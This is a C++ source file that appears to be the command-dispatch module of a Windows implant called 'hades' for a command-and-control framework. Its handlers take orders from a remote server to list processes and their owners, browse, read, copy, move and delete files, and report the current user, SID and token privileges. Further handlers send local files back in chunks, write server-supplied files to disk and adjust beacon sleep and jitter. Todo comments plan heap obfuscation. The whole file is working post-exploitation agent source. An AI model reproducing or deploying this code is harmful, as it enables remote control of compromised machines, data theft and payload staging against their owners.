#include "cmds.hpp"
#include "../hades/config.hpp"
#include <stdio.h>


/*
	todo
		start download server -> agent
		fix sleep
		start heap obf
		add reconfig
		fix profile parsing
*/





BOOL commanders::Dispatch(PBYTE Data, UINT size, PBYTE OutBuffer) {
	g_ByteMgr->InitRead(Data, size);
	UINT TotalCommands = g_ByteMgr->Read4();
	for (INT i = 0; i < TotalCommands; i++) {
		UINT CmdCode = g_ByteMgr->Read4();
		switch (CmdCode)
		{
		case CMD_CODE_PS:
			do_ps();
			break;
		case CMD_CODE_LS:
			do_ls();
			break;
		case CMD_CODE_MV:
			do_mv();
			break;

		case CMD_CODE_PWD:
			do_pwd();
			break;

		case CMD_CODE_CD:
			do_cd();
			break;

		case CMD_CODE_CAT:
			do_cat();
			break;

		case CMD_CODE_CP:
			do_cp();
			break;

		case CMD_CODE_RMDIR:
			do_rmdir();
			break;

		case CMD_CODE_RM:
			do_rm();
			break;

		case CMD_CODE_WHOAMI:
			do_whoami();
			break;
		case CMD_CODE_MKDIR:
			do_mkdir();
			break;
		case CMD_CODE_UPLOAD:
			do_upload();
			break;
		case CMD_CODE_DOWNLOAD:
			do_download();
			break;
		case CMD_CODE_RECONFIG:
			do_reconfig();
		default:
			break;
		}

	}

	return TRUE;
}


void commanders::do_reconfig() {

	g_ByteMgr->BeginTask();


	// messed up early with DB schema
	// to lazy to fix server side so for now just convert from str to int, ill fix later(probably never)
	UINT SleepLen = g_ByteMgr->Read4();
	PCHAR s = g_ByteMgr->ReadString(SleepLen);
	UINT JitterLen = g_ByteMgr->Read4();
	PCHAR j = g_ByteMgr->ReadString(JitterLen);


	hades->config->Sleep = IntFromStr(s);
	hades->config->Jitter = IntFromStr(j);

	g_ByteMgr->EndOk(RECONFIG_DONE);
}
void commanders::do_download() {
	HANDLE hFie = NULL;
	PCHAR Path = NULL;
	PBYTE Buf = NULL;

	UINT DataSize = 0;
	UINT PathLen = 0;

	UINT taskID = g_ByteMgr->BeginTask();
	UINT type = g_ByteMgr->Read4();

	if (type == UPLOAD_START_NON_CHUNKED || type == UPLOAD_START_CHUNKED) {
		PathLen = g_ByteMgr->Read4();
		Path = g_ByteMgr->ReadString(PathLen);
		hFie = hades->WinApis.CreateFileA(Path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFie == INVALID_HANDLE_VALUE) {
			g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
			goto CLEANUP;
		}
	}
	else {
		hFie = g_FileMgr->GetHandle(taskID);
	}
	DataSize = g_ByteMgr->Read4();
	Buf = (PBYTE)g_ByteMgr->ReadString(DataSize);
	if (!hades->WinApis.WriteFile(hFie, Buf, DataSize, NULL, NULL)) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}


	if (type == UPLOAD_START_CHUNKED) {
		g_FileMgr->InsertTask(taskID, hFie, FileUpload);
	}
	else if (type == TS_UPLOAD_DONE || type == UPLOAD_START_NON_CHUNKED) {
		hades->WinApis.CloseHandle(hFie);
		g_ByteMgr->EndOk(DOWNLOAD_SUCCESS);
		if (type == TS_UPLOAD_DONE) { g_FileMgr->RemoveTask(taskID); }

	}


CLEANUP:
	if (Path) { HeapFree(GetProcessHeap(), 0, Path); }
	if (Buf) { HeapFree(GetProcessHeap(), 0, Buf); }
	return;
}

void commanders::do_upload() {
	HANDLE hFile = NULL;
	PBYTE buf = NULL;

	ULONGLONG size = 0;
	DWORD high = 0;
	DWORD low = 0;
	DWORD chunksize = FILE_CHUNK_SIZE;
	DWORD BytesRead = 0;

	UINT TaskID = g_ByteMgr->BeginTask();

	UINT FileStrLen = g_ByteMgr->Read4();
	PCHAR File = g_ByteMgr->ReadString(FileStrLen);

	hFile = hades->WinApis.CreateFileA(File, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (!hFile || hFile == INVALID_HANDLE_VALUE) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}

	low = GetFileSize(hFile, &high);
	if (low == INVALID_FILE_SIZE && GetTeb()->LastErrorValue != NO_ERROR) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}

	size = ((ULONGLONG)high << 32) | low;

	buf = AllocMemory<BYTE>(chunksize);
	if (!buf) {
		g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
		goto CLEANUP;
	}

	if (!hades->WinApis.ReadFile(hFile, buf, chunksize, &BytesRead, NULL)) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}

	g_ByteMgr->Write4(STATUS_OK);
	g_ByteMgr->Write4(TASK_TYPE_UPLOAD);

	if (size > chunksize) {
		g_ByteMgr->Write4(UPLOAD_CHUNKED);
		//g_ByteMgr->Write8(size);
		g_ByteMgr->Write4(BytesRead);
		g_ByteMgr->WriteString(buf, BytesRead);

		if (!g_FileMgr->InsertTask(TaskID, hFile, FileDownload)) {
			g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
			goto CLEANUP;
		}

		hFile = NULL;
	}
	else {
		g_ByteMgr->Write4(UPLOAD_NO_CHUNKED);
		//g_ByteMgr->Write8(size);
		g_ByteMgr->Write4(BytesRead);
		g_ByteMgr->WriteString(buf, BytesRead);
	}

CLEANUP:
	if (File) { g_ByteMgr->FreeString(File); }
	if (buf) { HeapFree(GetProcessHeap(), 0, buf); }
	if (hFile && hFile != INVALID_HANDLE_VALUE) { hades->WinApis.CloseHandle(hFile); }
}


void commanders::do_whoami() {
	PTOKEN_PRIVILEGES TokenPrivs = NULL;
	PCHAR buf = NULL;
	HANDLE hToken = NULL;
	PTOKEN_USER TokenUsr = NULL;
	LPSTR SidStr = NULL;
	SID_NAME_USE sidType;
	NTSTATUS Stat;

	CHAR NameBuf[256] = { 0 };
	CHAR DomainBuf[256] = { 0 };
	DWORD NameLen = 256;
	DWORD DomainLen = 256;
	DWORD TokenUsrSize = 0;
	DWORD TokenPrivSize = 0;
	DWORD SidLen = 0;



	g_ByteMgr->BeginTask();

	Stat = hades->NtApis.NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
	if (!NTAPI_SUCCESS(Stat)) {
		g_ByteMgr->EndErr(ERROR_TOKEN_SIZE);
		goto CLEANUP;
	}

	hades->NtApis.NtQueryInformationToken(hToken, TokenUser, NULL, 0, &TokenUsrSize);
	TokenUsr = AllocMemory<TOKEN_USER>(TokenUsrSize);
	if (!TokenUsr) {
		g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
		goto CLEANUP;
	}

	Stat = hades->NtApis.NtQueryInformationToken(hToken, TokenUser, TokenUsr, TokenUsrSize, &TokenUsrSize);
	if (!NTAPI_SUCCESS(Stat)) {
		g_ByteMgr->EndErr(ERROR_TOKEN_SIZE);
		goto CLEANUP;
	}


	if (!hades->WinApis.ConvertSidToStringSidA(TokenUsr->User.Sid, &SidStr)) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}

	if (!hades->WinApis.LookupAccountSidA(NULL, TokenUsr->User.Sid, NameBuf, &NameLen, DomainBuf, &DomainLen, &sidType)) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}

	hades->NtApis.NtQueryInformationToken(hToken, TokenPrivileges, NULL, 0, &TokenPrivSize);
	TokenPrivs = AllocMemory<TOKEN_PRIVILEGES>(TokenPrivSize);
	if (!TokenPrivs) {
		g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
		goto CLEANUP;
	}

	Stat = hades->NtApis.NtQueryInformationToken(hToken, TokenPrivileges, TokenPrivs, TokenPrivSize, &TokenPrivSize);
	if (!NTAPI_SUCCESS(Stat)) {
		g_ByteMgr->EndErr(ERROR_TOKEN_SIZE);
		goto CLEANUP;
	}

	g_ByteMgr->Write4(STATUS_OK);
	g_ByteMgr->Write4(TASK_TYPE_GETPRIVS);
	g_ByteMgr->Write4(NameLen);
	g_ByteMgr->WriteString((PBYTE)NameBuf, NameLen);
	g_ByteMgr->Write4(DomainLen);
	g_ByteMgr->WriteString((PBYTE)DomainBuf, DomainLen);
	SidLen = (DWORD)strlen(SidStr);
	g_ByteMgr->Write4(SidLen);
	g_ByteMgr->WriteString((PBYTE)SidStr, SidLen);

	for (DWORD i = 0; i < TokenPrivs->PrivilegeCount; i++) {
		LUID_AND_ATTRIBUTES Privs = TokenPrivs->Privileges[i];
		CHAR PrivName[256] = { 0 };
		DWORD PrivNameLen = sizeof(PrivName);
		DWORD PrivStatus = 0;
		if (!hades->WinApis.LookupPrivilegeNameA(NULL, &Privs.Luid, PrivName, &PrivNameLen)) {
			continue;
		}
		if (Privs.Attributes & SE_PRIVILEGE_REMOVED) PrivStatus = PrivRemoved;
		else if (Privs.Attributes & SE_PRIVILEGE_ENABLED) PrivStatus = PrivEnabled;
		else if (Privs.Attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT) PrivStatus = PrivEnabledByDefault;
		else PrivStatus = PrivDisabled;

		g_ByteMgr->Write4(PrivNameLen);
		g_ByteMgr->WriteString((PBYTE)PrivName, PrivNameLen);
		g_ByteMgr->Write4(PrivStatus);
	}

	g_ByteMgr->Write4(END_SIG);

CLEANUP:
	if (TokenPrivs) { HeapFree(GetProcessHeap(), 0, TokenPrivs); }
	if (TokenUsr) { HeapFree(GetProcessHeap(), 0, TokenUsr); }
	if (SidStr) { LocalFree(SidStr); }
	if (hToken) { hades->WinApis.CloseHandle(hToken); }

}



void commanders::do_cat() {
	BOOL Result = FALSE;
	HANDLE hFile = NULL;
	PBYTE buf = NULL;
	DWORD ChunkSize = 2048;
	DWORD BytesRead = 0;


	g_ByteMgr->BeginTask();

	UINT FileLen = g_ByteMgr->Read4();
	PCHAR FileName = g_ByteMgr->ReadString(FileLen);

	hFile = hades->WinApis.CreateFileA(FileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (!hFile || hFile == INVALID_HANDLE_VALUE) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}
	buf = AllocMemory<BYTE>(ChunkSize);
	Result = hades->WinApis.ReadFile(hFile, (PBYTE)buf, ChunkSize, &BytesRead, NULL);
	if (Result) {
		g_ByteMgr->EndOkData(TASK_TYPE_NO_PARSE, BytesRead, buf);
		goto CLEANUP;
	}
	else {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}

CLEANUP:
	if (FileName) { g_ByteMgr->FreeString(FileName); }
	if (buf) { HeapFree(GetProcessHeap(), 0, buf); }
	if (hFile) { hades->WinApis.CloseHandle(hFile); }
	return;



}




void commanders::do_ls() {
	WIN32_FIND_DATAA FindData;
	HANDLE hFind = NULL;

	DWORD typeLen;
	DWORD BufSize = 12 * 1024;
	DWORD TotalSize = 0;
	DWORD Namelen = 0;
	DWORD EntryLen = 0;
	DWORD PathSize = 0;

	char path[MAX_PATH];
	const char* type;
	g_ByteMgr->BeginTask();

	UINT len = g_ByteMgr->Read4();
	PCHAR Dir = g_ByteMgr->ReadString(len);



	PathSize = hades->WinApis.GetFullPathNameA(Dir, MAX_PATH, path, NULL);
	DWORD attrs = hades->WinApis.GetFileAttributesA(Dir);
	BOOL file = (attrs != INVALID_FILE_ATTRIBUTES) && !(attrs & FILE_ATTRIBUTE_DIRECTORY);
	if (!file) {
		path[PathSize] = '\\';
		path[++PathSize] = '*';
		path[++PathSize] = '\0';
	}


	hFind = hades->WinApis.FindFirstFileA(path, &FindData);
	if (!hFind || hFind == INVALID_HANDLE_VALUE) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}


	g_ByteMgr->Write4(STATUS_OK);
	g_ByteMgr->Write4(TASK_TYPE_LS);
	do {
		if (strcmp(FindData.cFileName, "..") == 0 || strcmp(FindData.cFileName, ".") == 0) {
			continue;
		}
		if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			type = "DIR"; typeLen = 3;
		}
		else if (FindData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) {
			type = "LINK", typeLen = 4;
		}
		else {
			type = "FILE"; typeLen = 4;
		}

		UINT len = (UINT)strlen(FindData.cFileName);
		g_ByteMgr->Write4(len);
		g_ByteMgr->WriteString((PBYTE)FindData.cFileName, len);
		g_ByteMgr->Write4(typeLen);
		g_ByteMgr->WriteString((PBYTE)type, typeLen);
		ULONGLONG size = ((ULONGLONG)FindData.nFileSizeHigh << 32) | FindData.nFileSizeLow;
		g_ByteMgr->Write8(size);

	} while (hades->WinApis.FindNextFileA(hFind, &FindData));

	g_ByteMgr->Write4(END_SIG);

CLEANUP:
	if (Dir) { g_ByteMgr->FreeString(Dir); }

}

void commanders::do_cp() {
	g_ByteMgr->BeginTask();

	UINT srcLen = g_ByteMgr->Read4();
	PCHAR src = g_ByteMgr->ReadString(srcLen);
	UINT dstLen = g_ByteMgr->Read4();
	PCHAR dst = g_ByteMgr->ReadString(dstLen);

	BOOL Result = hades->WinApis.CopyFileA(src, dst, FALSE);
	if (!Result) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}
	g_ByteMgr->EndOk(CP_SUCCESS);
CLEANUP:
	if (src) { g_ByteMgr->FreeString(src); }
	if (dst) { g_ByteMgr->FreeString(dst); }
	return;

}


void commanders::do_rmdir() {
	g_ByteMgr->BeginTask();

	UINT DirLen = g_ByteMgr->Read4();
	PCHAR DirName = g_ByteMgr->ReadString(DirLen);

	if (!hades->WinApis.RemoveDirectoryA(DirName)) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}
	g_ByteMgr->EndOk(RMDIR_SUCCESS);

CLEANUP:
	if (DirName) { g_ByteMgr->FreeString(DirName); }
	return;
}


void commanders::do_mkdir() {
	g_ByteMgr->BeginTask();

	DWORD Len = g_ByteMgr->Read4();
	PCHAR Name = g_ByteMgr->ReadString(Len);

	if (!hades->WinApis.CreateDirectoryA(Name, NULL)) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}
	g_ByteMgr->EndOk(MKDIR_SUCCESS);

CLEANUP:
	if (Name) { g_ByteMgr->FreeString(Name); }
}

void commanders::do_rm() {
	g_ByteMgr->BeginTask();

	UINT NameLen = g_ByteMgr->Read4();
	PCHAR FileName = g_ByteMgr->ReadString(NameLen);

	if (!hades->WinApis.DeleteFileA(FileName)) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}
	g_ByteMgr->EndOk(RM_SUCCESS);

CLEANUP:
	if (FileName) { g_ByteMgr->FreeString(FileName); }
	return;
}

void commanders::do_cd() {
	g_ByteMgr->BeginTask();

	UINT DirLen = g_ByteMgr->Read4();
	PCHAR dir = g_ByteMgr->ReadString(DirLen);
	if (!hades->WinApis.SetCurrentDirectoryA(dir)) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}

	g_ByteMgr->EndOk(CD_SUCCESS);
CLEANUP:
	if (dir) { g_ByteMgr->FreeString(dir); }
	return;
}

void commanders::do_pwd() {
	DWORD Res = 0;
	UINT TaskID = g_ByteMgr->BeginTask();

	DWORD size = hades->WinApis.GetCurrentDirectoryA(0, NULL);

	PCHAR buf = AllocMemory<CHAR>(size);
	if (!buf) {
		g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
		goto CLEANUP;
	}

	Res = hades->WinApis.GetCurrentDirectoryA(size, buf);
	if (Res == 0 || Res >= size) {

		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}


	g_ByteMgr->EndOkData(TASK_TYPE_NO_PARSE, Res, (PBYTE)buf);

CLEANUP:
	if (buf) { HeapFree(GetProcessHeap(), 0, buf); }
	return;

	return;
}

void commanders::do_mv() {
	UINT TaskID = g_ByteMgr->BeginTask();

	UINT srclen = g_ByteMgr->Read4();
	PCHAR src = g_ByteMgr->ReadString(srclen);
	UINT dstlen = g_ByteMgr->Read4();
	PCHAR dest = g_ByteMgr->ReadString(dstlen);

	if (!hades->WinApis.MoveFileA(src, dest)) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}
	g_ByteMgr->EndOk(MV_SUCCESS);

CLEANUP:
	if (src) { g_ByteMgr->FreeString(src); };
	if (dest) { g_ByteMgr->FreeString(dest); }
	return;

}


//
void commanders::do_ps() {
	NTSTATUS stat;
	ULONG size = 0;
	PSYSTEM_PROCESS_INFORMATION spi = NULL;
	CLIENT_ID cid = { 0 };
	OBJECT_ATTRIBUTES oa;
	HANDLE hProc = NULL;
	HANDLE hToken = NULL;

	CHAR NameBuf[256];
	CHAR DomainBuf[256];
	DWORD NameLen = 256;
	DWORD DomainLen = 256;

	PBYTE buf = NULL;
	DWORD needed = 0;
	DWORD PID = 0;
	INT len = 0;

	const char* owner = "N/A";
	DWORD ownerLen = 3;

	g_ByteMgr->BeginTask();

	hades->NtApis.NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &size);
	buf = AllocMemory<BYTE>(size);

	if (!buf) {
		g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
		goto CLEANUP;
	}

	stat = hades->NtApis.NtQuerySystemInformation(SystemProcessInformation, buf, size, &size);
	if (!NTAPI_SUCCESS(stat)) {
		g_ByteMgr->EndErr(ERROR_PS_LIST);
		goto CLEANUP;
	}

	spi = (PSYSTEM_PROCESS_INFORMATION)buf;


	g_ByteMgr->Write4(STATUS_OK);
	g_ByteMgr->Write4(TASK_PS_LIST);
	while (TRUE) {
		CHAR line[512] = { 0 };
		const char* owner = "N/A";
		DWORD ownerLen = 3;
		if (!spi->ImageName.Buffer) {
			goto NEXT_ENTRY;
		}
		len = WideCharToMultiByte(CP_UTF8, 0, spi->ImageName.Buffer, spi->ImageName.Length / sizeof(WCHAR), line, sizeof(line) - 32, NULL, NULL);
		PID = (DWORD)(ULONG_PTR)spi->UniqueProcessId;

		cid.UniqueProcess = (HANDLE)(ULONG_PTR)PID;
		cid.UniqueThread = 0;

		InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
		stat = hades->NtApis.NtOpenProcess(&hProc, PROCESS_QUERY_LIMITED_INFORMATION, &oa, &cid);
		if (NTAPI_SUCCESS(stat)) {
			stat = hades->NtApis.NtOpenProcessToken(hProc, TOKEN_QUERY, &hToken);

			if (NTAPI_SUCCESS(stat)) {
				hades->WinApis.GetTokenInformation(hToken, TokenUser, NULL, 0, &needed);
				PTOKEN_USER tokenUsr = AllocMemory<TOKEN_USER>(needed);

				if (hades->WinApis.GetTokenInformation(hToken, TokenUser, tokenUsr, needed, &needed)) {

					SID_NAME_USE sidType;
					if (hades->WinApis.LookupAccountSidA(NULL, tokenUsr->User.Sid, NameBuf, &NameLen, DomainBuf, &DomainLen, &sidType)) {
						owner = NameBuf;
						ownerLen = NameLen;

					}
				}
				HeapFree(GetProcessHeap(), 0, tokenUsr);
				hades->WinApis.CloseHandle(hToken);
			}
			hades->WinApis.CloseHandle(hProc);
		}

		// todo handle domain
		g_ByteMgr->Write4(len);
		g_ByteMgr->WriteString((PBYTE)line, len);
		g_ByteMgr->Write4(ownerLen);
		g_ByteMgr->WriteString((PBYTE)owner, ownerLen);
		g_ByteMgr->Write4(PID);


	NEXT_ENTRY:
		if (spi->NextEntryOffset == NULL) break;
		spi = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)spi + spi->NextEntryOffset);
	}
	g_ByteMgr->Write4(END_SIG);

CLEANUP:
	if (buf) { HeapFree(GetProcessHeap(), 0, buf); }


}



commanders* g_Commander = NULL;